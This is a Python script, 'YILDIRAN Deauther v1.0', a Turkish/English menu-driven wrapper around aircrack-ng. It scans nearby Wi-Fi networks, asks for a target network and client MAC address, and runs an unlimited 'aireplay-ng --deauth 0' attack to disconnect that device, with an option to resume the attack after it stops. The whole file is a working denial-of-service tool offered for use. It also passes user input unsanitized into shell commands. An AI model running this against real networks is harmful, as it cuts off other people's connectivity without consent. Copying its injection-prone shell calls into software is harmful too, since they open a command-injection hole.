#YILDIRAN Deauther v1.0 by Chichi Yabgu

#importing neccessary modules
import os, sys, subprocess
from sys import platform
from colorama import Fore, Style
#

#definings
def app_details_tr():
    print(Fore.LIGHTBLUE_EX + "YILDIRAN Deauther v1.0 | Şehit Esad Oktay Yıldıran Anısına!\n" + Fore.GREEN + """
    Yazar: Chichi Yabgu
    Github: github.com/chichi-yabgu
    \n\n""" + Style.RESET_ALL)

def app_details_en():
    print(Fore.LIGHTBLUE_EX + "YILDIRAN Deauther v1.0 | In Memory of Martyr Esad Oktay Yıldıran!\n" + Fore.GREEN + """
    Author: Chichi Yabgu
    Github: github.com/chichi-yabgu
    \n\n""" + Style.RESET_ALL)

def installing_necessary_packages():
    os.system("apt-get install aircrack-ng && apt-get install wireless-tools")
#

#making program run on root
if not 'SUDO_UID' in os.environ.keys():
    print(Fore.RED + "Bu programı root olarak çalıştırmalısınız!/You must run this program as root!" + Style.RESET_ALL)
    sys.exit(1)
#

os.system("clear")
app_details_tr()

#make a input for selecting language (made by github copilot xd)
print(Fore.CYAN + "Dil seçin/Select language:")
print(Fore.CYAN + "1." + Fore.YELLOW + "Türkçe")
print(Fore.CYAN + "2." + Fore.YELLOW + "English\n")
language = input(Fore.BLUE + ">>> " + Style.RESET_ALL)
if language == "1":
    os.system("clear")
    installing_necessary_packages()
    os.system("clear")
    app_details_tr()
    print(Fore.CYAN + "Yapmak istediğiniz işlemi seçin:")
    print(Fore.CYAN + "1." + Fore.YELLOW + "Standart Deauth işlemi (Önerilen)")
    print(Fore.CYAN + "2." + Fore.YELLOW + "Monitör modda kalan network kartınızı normal moda geçirin")
    print(Fore.CYAN + "3." + Fore.YELLOW + "Network kartlarınızı görüntüleyin")
    process = input(Fore.BLUE + ">>> " + Style.RESET_ALL)
    if process == "1":
        os.system("sleep 1 && clear")
        print(Fore.CYAN + "Deauth işlemi başlatılıyor...\n" + Style.RESET_ALL)
        os.system("sleep 2 && clear && iwconfig")
        print(Fore.CYAN + "Kullanmak istediğiniz network kartınızın adını giriniz:")
        network_card = input(Fore.BLUE + ">>> " + Style.RESET_ALL)
        os.system("clear")
        if not network_card:
            print(Fore.RED + "Lütfen geçerli bir network kartı giriniz!\n" + Style.RESET_ALL)
            sys.exit(1)
        else:
            os.system("clear")
            os.system("airmon-ng start " + network_card)
            print(Fore.CYAN + "Network kartınız monitör moda alındı ve ismi " + Fore.YELLOW + network_card + "mon" + Fore.CYAN + " olarak değiştirildi! Eğer program beklenmedik bir şekilde kapanırsa, monitör modu kapatmak için programı yeniden başlatın ve 2. işlemi seçin.\n")
            print(Fore.CYAN + "Şimdi, network kartınızın algıladığı ağları görüntüleyeceksiniz.\n")
            input(Fore.YELLOW + "Devam etmek için <ENTER> tuşuna basınız:" + Style.RESET_ALL)
            os.system("clear")
            os.system("airodump-ng " + network_card + "mon")
            print(Fore.CYAN + "Hedeflediğiniz ağın BSSID(mac adresi)'sini giriniz:" + Style.RESET_ALL)
            target_network = input(Fore.BLUE + ">>> " + Style.RESET_ALL)
            if not target_network:
                print(Fore.RED + "Lütfen geçerli bir BSSID(mac adresi) giriniz!\n" + Style.RESET_ALL)
                sys.exit(1)
            else:
                print(Fore.CYAN + "Hedeflediğiniz ağın CH(kanal)'sini giriniz:" + Style.RESET_ALL)
                target_channel = input(Fore.BLUE + ">>> " + Style.RESET_ALL)
                if not target_channel:
                    print(Fore.RED + "Lütfen geçerli bir CH(kanal) giriniz!\n" + Style.RESET_ALL)
                    sys.exit(1)
                else:
                    os.system("sleep 1 && clear")
                    print(Fore.CYAN + "Şimdi, " + Fore.YELLOW + target_network + Fore.CYAN + " ağının " + Fore.YELLOW + target_channel + Fore.CYAN + " kanalında " + Fore.YELLOW + network_card + "mon" + Fore.CYAN + " network kartını kullanarak ağda tarama yapacağız.\n")
                    input(Fore.YELLOW + "Devam etmek için <ENTER> tuşuna basınız:" + Style.RESET_ALL)
                    os.system("clear && airodump-ng -c " + target_channel + " --bssid " + target_network + " " + network_card + "mon")
                    print(Fore.CYAN + "Deauth etmek istediğiniz cihazın BSSID(mac adresi)'sini giriniz:" + Style.RESET_ALL)
                    target_device = input(Fore.BLUE + ">>> " + Style.RESET_ALL)
                    if not target_device:
                        print(Fore.RED + "Lütfen geçerli bir BSSID(mac adresi) giriniz!\n" + Style.RESET_ALL)
                        sys.exit(1)
                    else:
                        os.system("sleep 1 && clear")
                        print(Fore.CYAN + "Şimdi, " + Fore.YELLOW + target_network + Fore.CYAN + " ağının " + Fore.YELLOW + target_channel + Fore.CYAN + " kanalında bulunan " + Fore.YELLOW + target_device + Fore.CYAN + " cihazını " + Fore.YELLOW + network_card + "mon" + Fore.CYAN + " network kartını kullanarak deauth edeceğiz!\n Durmak istediğinizde CTRL+C tuş kombinasyonunu kullanın.\n")
                        input(Fore.YELLOW + "Devam etmek için <ENTER> tuşuna basınız:" + Style.RESET_ALL)
                        os.system("clear && aireplay-ng --deauth 0 -a " + target_network + " -c " + target_device + " " + network_card + "mon")
                        os.system("clear")
                        while True:
                            action = input(Fore.CYAN + "Deauth işlemi durduruldu!\n Devam etmek istiyor musunuz? (e/h):")
                            if action == "E" or action == "e":
                                os.system("clear")
                                print(Fore.CYAN + "Deauth işlemine devam ediliyor...\n" + Style.RESET_ALL)
                                os.system("sleep 2 && clear && aireplay-ng --deauth 0 -a " + target_network + " -c " + target_device + " " + network_card + "mon")
                            elif action == "H" or action == "h":
                                os.system("clear")
                                print(Fore.CYAN + "Deauth işlemi durduruldu!\n Şimdi, network kartınızı monitör moddan normal moda alacağız. Bu sayede, Internet'te gezinmeye devam edebileceksiniz." + Style.RESET_ALL)
                                input(Fore.YELLOW + "Devam etmek için <ENTER> tuşuna basınız:" + Style.RESET_ALL)
                                os.system("clear && airmon-ng stop " + network_card + "mon")
                                print(Fore.CYAN + "Network kartınız monitör modundan normal moda alındı!\n Artık Internet'te gezinmeye devam edebilirsiniz!" + Style.RESET_ALL)
                                sys.exit(0)
    if process == "2":
        os.system("clear")
        print(Fore.CYAN + "Şimdi, monitör modunda kalan network kartınızın ismini sonunda mon eki olmadan girmelisiniz." + Style.RESET_ALL)
        network_card = input(Fore.BLUE + ">>> " + Style.RESET_ALL)
        if not network_card:
            print(Fore.RED + "Lütfen geçerli bir network kartı giriniz!\n" + Style.RESET_ALL)
            sys.exit(1)
        else:
            os.system("sleep 1 && clear && airmon-ng stop " + network_card)
            print(Fore.CYAN + "Network kartınız monitör modundan normal moda alındı!\n Artık Internet'te gezinmeye devam edebilirsiniz!" + Style.RESET_ALL)
            sys.exit(0)
    if process == "3":
        os.system("sleep 1 && clear && iwconfig")
        print(Fore.CYAN + "Network kartlarınız görüntülendi.")
        sys.exit(0)




if language == "2":
    os.system("clear")
    installing_necessary_packages()
    os.system("clear")
    app_details_en()
    print(Fore.CYAN + "Select the process you want to run:")
    print(Fore.CYAN + "1." + Fore.YELLOW + "Standard Deauth process (Recommended)")
    print(Fore.CYAN + "2." + Fore.YELLOW + "Switch your network card remaining in monitor mode to normal mode")
    print(Fore.CYAN + "3." + Fore.YELLOW + "List your network cards")
    process = input(Fore.BLUE + ">>> " + Style.RESET_ALL)
    if process == "1":
        os.system("sleep 1 && clear")
        print(Fore.CYAN + "Deauth process is starting...\n" + Style.RESET_ALL)
        os.system("sleep 2 && clear && iwconfig")
        print(Fore.CYAN + "Select your network card:" + Style.RESET_ALL)
        network_card = input(Fore.BLUE + ">>> " + Style.RESET_ALL)
        os.system("clear")
        if not network_card:
            print(Fore.RED + "Please enter a valid network card!\n" + Style.RESET_ALL)
            sys.exit(1)
        else:
            os.system("clear")
            os.system("airmon-ng start " + network_card)
            print(Fore.CYAN + "Your network card turned into monitor mode and its name changed to " + Fore.YELLOW + network_card + "mon" + Fore.CYAN + "! If the program quits unexpectedly, restart the program and choose the 2nd process to turn off the monitor mode.\n")
            print(Fore.CYAN + "Now, you will view the networks detected by your network card. \n")
            input(Fore.YELLOW + "Press <ENTER> to continue:" + Style.RESET_ALL)
            os.system("clear")
            os.system("airodump-ng " + network_card + "mon")
            print(Fore.CYAN + "Enter the BSSID(mac address) of the target network:" + Style.RESET_ALL)
            target_network = input(Fore.BLUE + ">>> " + Style.RESET_ALL)
            if not target_network:
                print(Fore.RED + "Please enter a valid BSSID(mac address)\n" + Style.RESET_ALL)
                sys.exit(1)
            else:
                print(Fore.CYAN + "Enter the CH(channel) of the target network:" + Style.RESET_ALL)
                target_channel = input(Fore.BLUE + ">>> " + Style.RESET_ALL)
                if not target_channel:
                    print(Fore.RED + "Please enter a valid CH(channel)!\n" + Style.RESET_ALL)
                    sys.exit(1)
                else:
                    os.system("sleep 1 && clear")
                    print(Fore.CYAN + "Now, we will scan the network" + Fore.YELLOW + target_network + Fore.CYAN + " on the channel " + Fore.YELLOW + target_channel + Fore.CYAN + " using the network card " + Fore.YELLOW + network_card + "mon" + Fore.CYAN + ".\n")
                    input(Fore.YELLOW + "Press <ENTER> to continue:" + Style.RESET_ALL)
                    os.system("clear && airodump-ng -c " + target_channel + " --bssid " + target_network + " " + network_card + "mon")
                    print(Fore.CYAN + "Enter the BSSID(mac address) of the device you want to deauth:" + Style.RESET_ALL)
                    target_device = input(Fore.BLUE + ">>> " + Style.RESET_ALL)
                    if not target_device:
                        print(Fore.RED + "Please enter a valid BSSID(mac address)!\n" + Style.RESET_ALL)
                        sys.exit(1)
                    else:
                        os.system("sleep 1 && clear")
                        print(Fore.CYAN + "Now, we will deauth the device " + Fore.YELLOW + target_device + Fore.CYAN + " in the network " + Fore.YELLOW + target_network + Fore.CYAN + " on the channel " + Fore.YELLOW + target_channel + Fore.CYAN + " using the network card " + Fore.YELLOW + network_card + "mon" + Fore.CYAN + "!\n When you want to stop, use the CTRL+C key combination.\n")
                        input(Fore.YELLOW + "Press <ENTER> to continue:" + Style.RESET_ALL)
                        os.system("clear && aireplay-ng --deauth 0 -a " + target_network + " -c " + target_device + " " + network_card + "mon")
                        os.system("clear")
                        while True:
                            action = input(Fore.CYAN + "Deauth process stopped. Do you want to continue? (y/n):")
                            if action == "Y" or action == "y":
                                os.system("clear")
                                print(Fore.CYAN + "Deauth in progress...\n" + Style.RESET_ALL)
                                os.system("sleep 2 && clear && aireplay-ng --deauth 0 -a " + target_network + " -c " + target_device + " " + network_card + "mon")
                            elif action == "N" or action == "n":
                                os.system("clear")
                                print(Fore.CYAN + "Deauth process stopped!\n Now, we will turn your network card from monitor mode to normal mode. Then, you will be able to continue surfing the Internet." + Style.RESET_ALL)
                                input(Fore.YELLOW + "Press <ENTER> to continue:" + Style.RESET_ALL)
                                os.system("clear && airmon-ng stop " + network_card + "mon")
                                print(Fore.CYAN + "Your network card has been turned from monitor mode to normal mode!\n Now, you can continue surf on the Internet." + Style.RESET_ALL)
                                sys.exit(0)
    if process == "2":
        os.system("clear")
        print(Fore.CYAN + "Now, you need to enter the name of your network card, which remains in monitor mode, without the mon suffix at the end." + Style.RESET_ALL)
        network_card = input(Fore.BLUE + ">>> " + Style.RESET_ALL)
        if not network_card:
            print(Fore.RED + "Please enter a valid network card!\n" + Style.RESET_ALL)
            sys.exit(1)
        else:
            os.system("sleep 1 && clear && airmon-ng stop " + network_card)
            print(Fore.CYAN + "Your network card has been turned from monitor mode to normal mode!\n Now, you can continue surf on the Internet." + Style.RESET_ALL)
            sys.exit(0)
    if process == "3":
        os.system("sleep 1 && clear && iwconfig")
        print(Fore.CYAN + "Your network cards are listed.")
        sys.exit(0)





else:
    print(Fore.RED + "Lütfen geçerli bir dil seçin/Please enter a valid language!\n" + Style.RESET_ALL)
    sys.exit(1)
